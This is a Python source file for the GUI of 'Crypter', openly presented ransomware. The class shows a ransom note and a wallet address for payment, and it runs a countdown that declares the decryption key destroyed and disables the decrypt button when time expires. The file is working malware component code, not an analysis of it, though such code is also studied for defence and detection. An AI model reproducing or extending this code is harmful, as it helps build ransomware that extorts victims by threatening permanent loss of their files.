"""Subclass of MainFrame, which is generated by wxFormBuilder."""
'''
@summary: Crypter: GUI Class
@author: MLS
@version: 1.70
'''

# Import libs
import wx
import os
import time

# Import Classes
import GuiAbsBase
import Base

# Implementing MainFrame
class Gui( GuiAbsBase.MainFrame, Base.Base):
	'''
	@summary: Main GUI class. Inherits from GuiAbsBase and defines Crypter specific functions,
	labels, text, buttons, images etc. Also inherits from main Base for schema
	'''
	
	def __init__( self, image_path, start_time, encrypted_file_list, decrypter ):
		'''
		@summary: Constructor
		@param image_path: The path to look at to find resources, such as images.
		@param start_time: EPOCH time that the encryption finished.
		@param encrypted_file_list: List of encrypted files
		@param decrypter: Handle back to Main. For calling decryption method
		'''
		# Handle Params
		self.image_path = image_path
		self.start_time = start_time
		self.encrypted_file_list = encrypted_file_list
		self.decrypter = decrypter
		
		# Define other vars
		self.set_message_to_null = True
		
		# Super
		GuiAbsBase.MainFrame.__init__( self, parent=None )
		
		# Update GUI visuals
		self.update_visuals()
		
		# Update events
		self.set_events()
		

	def set_events(self):
		'''
		@summary: Create button and timer events for GUI
		'''

		# Create and bind timer event
		self.key_destruction_timer = wx.Timer()
		self.key_destruction_timer.SetOwner( self, wx.ID_ANY )
		self.key_destruction_timer.Start( 500 )
		self.Bind(wx.EVT_TIMER, self.blink, self.key_destruction_timer)
		
		# Create button events
		# TODO Continue with implementing new dialogoues and their functionality
		#self.Bind(wx.EVT_BUTTON, self.show_encrypted_files)
		#self.Bind(wx.EVT_BUTTON)
		
		
	def blink(self, event):
		'''
		@summary: Blinks the subheader text
		'''
		
		# Set message to blank
		if self.set_message_to_null:
			self.FlashingMessageText.SetLabelText("")
			self.set_message_to_null = False
		# Set message to text
		else:
			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
			self.set_message_to_null = True
		
		# Update the time remaining
		time_remaining = self.get_time_remaining()
		self.KeyDestructionTime.SetLabelText(time_remaining)
		
		# If the key has been destroyed, update the menu text
		if time_remaining.lower() == "key destroyed":
			# Set timer colour to black
			self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings_GetColour(
				wx.SYS_COLOUR_CAPTIONTEXT))
			# Disable decryption button
			self.EnterDecryptionKeyButton.Disable()
		
		
	def get_time_remaining(self):
		'''
		@summary: Method to read the time of encryption and determine the time remaining
		before the decryption key is destroyed
		@return: time remaining until decryption key is destroyed
		'''
		
		seconds_elapsed = int(time.time() - int(self.start_time))
		
		_time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
		if _time_remaining <= 0:
			return "KEY DESTROYED"
		
		minutes, seconds = divmod(_time_remaining, 60)
		hours, minutes = divmod(minutes, 60)
		
		return "%d:%02d:%02d" % (hours, minutes, seconds)
		
		
	def update_visuals(self):
		'''
		@summary: Method to update the GUI visuals/aesthetics, i.e labels, images etc.
		'''

		# Set title
		self.CrypterTitleBitmap.SetBitmap(
			wx.Bitmap(
				os.path.join(self.image_path, self.GUI_IMAGE_TITLE),
				wx.BITMAP_TYPE_ANY))
		
		# Set flashing text initial label
		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
		
		# Set Ransom Message
		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE)

		# Set Logo
		self.LockBitmap.SetBitmap(
			wx.Bitmap(
				os.path.join(self.image_path, self.GUI_IMAGE_LOGO),
				wx.BITMAP_TYPE_ANY))

		# Set key destruction label
		self.KeyDestructionLabel.SetLabel(self.GUI_LABEL_TEXT_KEY_DESTRUCTION)

		# Set Wallet Address label
		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS)
		
		# Set Wallet Address Value
		self.WalletAddressString.SetLabel(self.WALLET_ADDRESS)

		# Set Button Text
		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES)
		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY)
		
		